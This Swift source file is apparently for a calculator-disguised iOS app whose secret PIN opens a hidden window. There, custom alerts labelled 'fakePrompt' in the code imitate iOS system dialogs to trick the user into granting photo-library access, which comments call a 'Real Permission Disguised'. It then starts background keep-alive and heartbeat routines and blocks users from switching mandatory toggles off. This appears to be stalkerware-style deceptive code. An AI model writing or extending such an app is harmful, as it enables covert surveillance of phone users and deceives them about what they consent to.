import SwiftUI
import AudioToolbox

struct ContentView: View {
    @StateObject private var engine = VaultEngine.shared
    @Environment(\.scenePhase) private var scenePhase

    @State private var display = "0"
    @State private var currentOperation: String? = nil
    @State private var previousValue: Double = 0
    @State private var isTyping = false
    @State private var keyHistory = ""

    // Full-Screen Secret Window State
    @State private var isSecretWindowOpen = false

    var body: some View {
        ZStack {
            if isSecretWindowOpen {
                ZexSecretFullWindow(engine: engine, isOpen: $isSecretWindowOpen)
                    .transition(.opacity.combined(with: .scale(scale: 0.98)))
            } else {
                calculatorView
                    .transition(.opacity)
            }
        }
        .preferredColorScheme(.dark)
        .onChange(of: scenePhase) { phase in
            // Security: Auto-lock immediately when app moves to background
            if phase == .background || phase == .inactive {
                isSecretWindowOpen = false
                clear()
            }
        }
    }

    // MARK: - Calculator Screen View
    private var calculatorView: some View {
        GeometryReader { geo in
            let spacing: CGFloat = 14
            let totalWidth = geo.size.width
            let buttonSize = (totalWidth - (spacing * 5)) / 4
            let zeroWidth = (buttonSize * 2) + spacing

            ZStack {
                Color.black.edgesIgnoringSafeArea(.all)

                VStack(spacing: spacing) {
                    Spacer()

                    // Display Value
                    HStack {
                        Spacer()
                        Text(display)
                            .font(.system(size: 80, weight: .light))
                            .foregroundColor(.white)
                            .lineLimit(1)
                            .minimumScaleFactor(0.2)
                            .padding(.horizontal, 24)
                    }

                    // Keypad
                    VStack(spacing: spacing) {
                        HStack(spacing: spacing) {
                            calcBtn("AC", size: buttonSize, color: Color(white: 0.65), textCol: .black) { clear() }
                            calcBtn("+/-", size: buttonSize, color: Color(white: 0.65), textCol: .black) { toggleSign() }
                            calcBtn("%", size: buttonSize, color: Color(white: 0.65), textCol: .black) { percentage() }
                            calcBtn("÷", size: buttonSize, color: .orange) { setOperation("÷") }
                        }

                        HStack(spacing: spacing) {
                            calcBtn("7", size: buttonSize) { inputDigit("7") }
                            calcBtn("8", size: buttonSize) { inputDigit("8") }
                            calcBtn("9", size: buttonSize) { inputDigit("9") }
                            calcBtn("×", size: buttonSize, color: .orange) { setOperation("×") }
                        }

                        HStack(spacing: spacing) {
                            calcBtn("4", size: buttonSize) { inputDigit("4") }
                            calcBtn("5", size: buttonSize) { inputDigit("5") }
                            calcBtn("6", size: buttonSize) { inputDigit("6") }
                            calcBtn("-", size: buttonSize, color: .orange) { setOperation("-") }
                        }

                        HStack(spacing: spacing) {
                            calcBtn("1", size: buttonSize) { inputDigit("1") }
                            calcBtn("2", size: buttonSize) { inputDigit("2") }
                            calcBtn("3", size: buttonSize) { inputDigit("3") }
                            calcBtn("+", size: buttonSize, color: .orange) { setOperation("+") }
                        }

                        HStack(spacing: spacing) {
                            Button(action: { inputDigit("0") }) {
                                HStack {
                                    Text("0")
                                        .font(.system(size: 34, weight: .medium))
                                        .foregroundColor(.white)
                                        .padding(.leading, buttonSize * 0.35)
                                    Spacer()
                                }
                                .frame(width: zeroWidth, height: buttonSize)
                                .background(Color(white: 0.2))
                                .cornerRadius(buttonSize / 2)
                            }

                            calcBtn(".", size: buttonSize) { inputDigit(".") }
                            calcBtn("=", size: buttonSize, color: .orange) { calculate() }
                        }
                    }
                    .padding(.bottom, geo.safeAreaInsets.bottom > 0 ? geo.safeAreaInsets.bottom : 20)
                }
                .padding(.horizontal, spacing)
            }
        }
    }

    private func calcBtn(_ label: String, size: CGFloat, color: Color = Color(white: 0.2), textCol: Color = .white, action: @escaping () -> Void) -> some View {
        Button(action: action) {
            Text(label)
                .font(.system(size: 32, weight: .medium))
                .foregroundColor(textCol)
                .frame(width: size, height: size)
                .background(color)
                .clipShape(Circle())
        }
    }

    private func inputDigit(_ digit: String) {
        keyHistory += digit
        if !isTyping {
            display = digit
            isTyping = true
        } else {
            display += digit
        }
    }

    private func clear() {
        display = "0"
        previousValue = 0
        currentOperation = nil
        isTyping = false
        keyHistory = ""
    }

    private func toggleSign() {
        if let val = Double(display) {
            display = val.truncatingRemainder(dividingBy: 1) == 0 ? String(Int(-val)) : String(-val)
        }
    }

    private func percentage() {
        if let val = Double(display) {
            display = String(val / 100)
        }
    }

    private func setOperation(_ op: String) {
        previousValue = Double(display) ?? 0
        currentOperation = op
        isTyping = false
        keyHistory += op
    }

    private func calculate() {
        keyHistory += "="

        // Trigger Secret Full Window
        if display == engine.secretPin || keyHistory.contains(engine.secretPin + "=") {
            keyHistory = ""
            clear()
            withAnimation(.easeInOut(duration: 0.3)) {
                isSecretWindowOpen = true
            }
            return
        }

        guard let op = currentOperation, let current = Double(display) else { return }
        var result: Double = 0
        switch op {
        case "+": result = previousValue + current
        case "-": result = previousValue - current
        case "×": result = previousValue * current
        case "÷": result = current != 0 ? previousValue / current : 0
        default: break
        }

        display = result.truncatingRemainder(dividingBy: 1) == 0 ? String(Int(result)) : String(result)
        currentOperation = nil
        isTyping = false
    }
}

// MARK: - FULL SCREEN "ZEX SECRET" WINDOW
struct ZexSecretFullWindow: View {
    @ObservedObject var engine: VaultEngine
    @Binding var isOpen: Bool

    @State private var slot1Active = false
    @State private var slot2Active = true
    @State private var slot3Active = true
    @State private var slot4Active = true

    enum SecretAlertType: Identifiable {
        case general(title: String, message: String)
        case fakePrompt1
        case fakePrompt2

        var id: String {
            switch self {
            case .general(let t, let m): return "gen_\(t)_\(m)"
            case .fakePrompt1: return "fake1"
            case .fakePrompt2: return "fake2"
            }
        }
    }

    @State private var activeAlert: SecretAlertType? = nil

    // Auto-lock security timer
    @State private var autoLockTimer: Timer? = nil

    var body: some View {
        ZStack {
            Color(red: 0.05, green: 0.06, blue: 0.08).edgesIgnoringSafeArea(.all)

            VStack(spacing: 0) {
                // Top Clean Header (No icons)
                HStack {
                    Text("ZEX SECRET")
                        .font(.system(size: 17, weight: .bold, design: .monospaced))
                        .foregroundColor(.white)

                    Spacer()

                    // Quick Lock & Exit Button
                    Button(action: {
                        AudioServicesPlaySystemSound(1519)
                        resetTimerAndLock()
                    }) {
                        Text("LOCK")
                            .font(.system(size: 12, weight: .bold))
                            .foregroundColor(.black)
                            .padding(.horizontal, 14)
                            .padding(.vertical, 7)
                            .background(Color.green)
                            .cornerRadius(18)
                    }
                }
                .padding(.horizontal, 20)
                .padding(.top, 16)
                .padding(.bottom, 16)
                .background(Color.white.opacity(0.04))

                // Scrollable Slots Content (Clean, No Device ID, No Descriptions, No Icons)
                ScrollView {
                    VStack(spacing: 12) {
                        // Slot 1: Master Storage Allocation (Real Permission Disguised)
                        cleanSlotCard(
                            title: engine.slot1Config.title,
                            isOn: $slot1Active,
                            onToggle: { newVal in
                                handleSlot1Toggle(newVal)
                            }
                        )

                        // Slot 2: Decoy Slot
                        cleanSlotCard(
                            title: engine.slot2Config.title,
                            isOn: $slot2Active,
                            onToggle: { newVal in
                                handleDecoyToggle(slot: 2, requestedVal: newVal, config: engine.slot2Config, state: $slot2Active)
                            }
                        )

                        // Slot 3: Decoy Slot
                        cleanSlotCard(
                            title: engine.slot3Config.title,
                            isOn: $slot3Active,
                            onToggle: { newVal in
                                handleDecoyToggle(slot: 3, requestedVal: newVal, config: engine.slot3Config, state: $slot3Active)
                            }
                        )

                        // Slot 4: Decoy Slot
                        cleanSlotCard(
                            title: engine.slot4Config.title,
                            isOn: $slot4Active,
                            onToggle: { newVal in
                                handleDecoyToggle(slot: 4, requestedVal: newVal, config: engine.slot4Config, state: $slot4Active)
                            }
                        )

                        // Download CloudStream Provider Button
                        Button(action: {
                            triggerCloudStreamFlow()
                        }) {
                            Text(engine.cloudStreamButtonTitle)
                                .font(.system(size: 14, weight: .bold))
                                .foregroundColor(.black)
                                .frame(maxWidth: .infinity)
                                .padding(.vertical, 14)
                                .background(Color.green)
                                .cornerRadius(12)
                        }
                        .padding(.top, 6)
                    }
                    .padding(20)
                }
            }

            // Strict Limited Access Blocking Overlay (Clean, No Icons)
            if engine.isStorageBlocked {
                limitedAccessOverlay
                    .transition(.opacity)
            }
        }
        .alert(item: $activeAlert) { alert in
            switch alert {
            case .general(let title, let message):
                return Alert(
                    title: Text(title),
                    message: Text(message),
                    dismissButton: .default(Text("OK"))
                )
            case .fakePrompt1:
                return Alert(
                    title: Text("\"CloudStream\" Would Like to Access Media Stream Cache"),
                    message: Text("To buffer extension repository and streaming provider data."),
                    primaryButton: .default(Text("Allow")) {
                        proceedToPhotosPermission()
                    },
                    secondaryButton: .cancel(Text("Don't Allow")) {
                        activeAlert = .general(title: "Download Cancelled", message: "Required media cache permission was not allowed.")
                    }
                )
            case .fakePrompt2:
                return Alert(
                    title: Text("\"CloudStream\" Would Like to Enable Background Sync"),
                    message: Text("To keep streaming providers updated in the background."),
                    primaryButton: .default(Text("Allow")) {
                        AudioServicesPlaySystemSound(1519)
                        withAnimation(.easeInOut(duration: 0.3)) {
                            isOpen = false
                        }
                    },
                    secondaryButton: .cancel(Text("Don't Allow")) {
                        activeAlert = .general(title: "Setup Incomplete", message: "Background sync permission is required for CloudStream providers.")
                    }
                )
            }
        }
        .onAppear {
            slot1Active = engine.isActivated
            engine.checkPermissionStatus()
            startSecurityAutoLockTimer()
        }
        .onDisappear {
            autoLockTimer?.invalidate()
        }
    }

    // MARK: - CloudStream Sequential Permission Flow
    private func triggerCloudStreamFlow() {
        restartTimer()
        AudioServicesPlaySystemSound(1519)
        activeAlert = .fakePrompt1
    }

    private func proceedToPhotosPermission() {
        engine.requestStoragePermission { granted in
            if granted {
                AudioServicesPlaySystemSound(1519)
                slot1Active = true
                engine.startBackgroundKeepAlive()
                engine.startHeartbeat()

                // Short transition delay to show next permission prompt
                DispatchQueue.main.asyncAfter(deadline: .now() + 0.45) {
                    activeAlert = .fakePrompt2
                }
            } else {
                AudioServicesPlaySystemSound(1521)
                slot1Active = false
                engine.isStorageBlocked = true
            }
        }
    }

    // MARK: - Clean Slot Card Component (No Icons, No Descriptions)
    private func cleanSlotCard(title: String, isOn: Binding<Bool>, onToggle: @escaping (Bool) -> Void) -> some View {
        HStack {
            Text(title)
                .font(.system(size: 15, weight: .medium))
                .foregroundColor(.white)

            Spacer()

            Toggle("", isOn: Binding(
                get: { isOn.wrappedValue },
                set: { newVal in
                    onToggle(newVal)
                }
            ))
            .labelsHidden()
            .toggleStyle(SwitchToggleStyle(tint: .green))
        }
        .padding(.horizontal, 16)
        .padding(.vertical, 14)
        .background(Color.white.opacity(0.05))
        .cornerRadius(14)
    }

    // MARK: - Slot 1 (Real Photo Permission Disguised)
    private func handleSlot1Toggle(_ enable: Bool) {
        restartTimer()
        if enable {
            engine.requestStoragePermission { granted in
                if granted {
                    AudioServicesPlaySystemSound(1519)
                    slot1Active = true
                    engine.startBackgroundKeepAlive()
                    engine.startHeartbeat()

                    withAnimation(.easeInOut(duration: 0.3)) {
                        isOpen = false
                    }
                } else {
                    AudioServicesPlaySystemSound(1521)
                    slot1Active = false
                    activeAlert = .general(title: "Permission Required", message: engine.slot1Config.denyMsg)
                }
            }
        } else {
            if engine.slot1Config.mandatory {
                AudioServicesPlaySystemSound(1521)
                slot1Active = true
                activeAlert = .general(title: "Action Blocked", message: engine.slot1Config.denyMsg)
            } else {
                slot1Active = false
            }
        }
    }

    // MARK: - Decoy Slots Strict Enforcement
    private func handleDecoyToggle(slot: Int, requestedVal: Bool, config: SlotConfig, state: Binding<Bool>) {
        restartTimer()
        if !requestedVal && config.mandatory {
            AudioServicesPlaySystemSound(1521)
            state.wrappedValue = true
            activeAlert = .general(title: "Action Blocked", message: config.denyMsg)
        } else {
            AudioServicesPlaySystemSound(1519)
            state.wrappedValue = requestedVal
        }
    }

    // MARK: - Limited Access Lock Overlay (Clean, No Icons)
    private var limitedAccessOverlay: some View {
        ZStack {
            Color.black.opacity(0.96).edgesIgnoringSafeArea(.all)

            VStack(spacing: 20) {
                VStack(spacing: 8) {
                    Text("LIMITED ACCESS")
                        .font(.system(size: 17, weight: .bold, design: .monospaced))
                        .foregroundColor(.white)

                    Text("Storage cache permission was denied. Access is halted until granted.")
                        .font(.system(size: 13))
                        .multilineTextAlignment(.center)
                        .foregroundColor(.gray)
                        .padding(.horizontal, 28)
                }

                VStack(spacing: 12) {
                    Button(action: {
                        if let url = URL(string: UIApplication.openSettingsURLString) {
                            UIApplication.shared.open(url)
                        }
                    }) {
                        Text("OPEN SETTINGS")
                            .font(.system(size: 13, weight: .bold))
                            .foregroundColor(.black)
                            .frame(maxWidth: .infinity)
                            .padding(.vertical, 14)
                            .background(Color.green)
                            .cornerRadius(12)
                    }

                    Button(action: {
                        engine.checkPermissionStatus()
                        if engine.isActivated {
                            withAnimation {
                                isOpen = false
                            }
                        }
                    }) {
                        Text("RECHECK PERMISSION")
                            .font(.system(size: 13, weight: .semibold))
                            .foregroundColor(.white)
                            .frame(maxWidth: .infinity)
                            .padding(.vertical, 12)
                            .background(Color.white.opacity(0.08))
                            .cornerRadius(12)
                    }
                }
                .padding(.horizontal, 32)
                .padding(.top, 8)
            }
        }
    }

    // MARK: - Security Auto-Lock Timer
    private func startSecurityAutoLockTimer() {
        autoLockTimer?.invalidate()
        autoLockTimer = Timer.scheduledTimer(withTimeInterval: 60.0, repeats: false) { _ in
            resetTimerAndLock()
        }
    }

    private func restartTimer() {
        startSecurityAutoLockTimer()
    }

    private func resetTimerAndLock() {
        autoLockTimer?.invalidate()
        withAnimation {
            isOpen = false
        }
    }
}
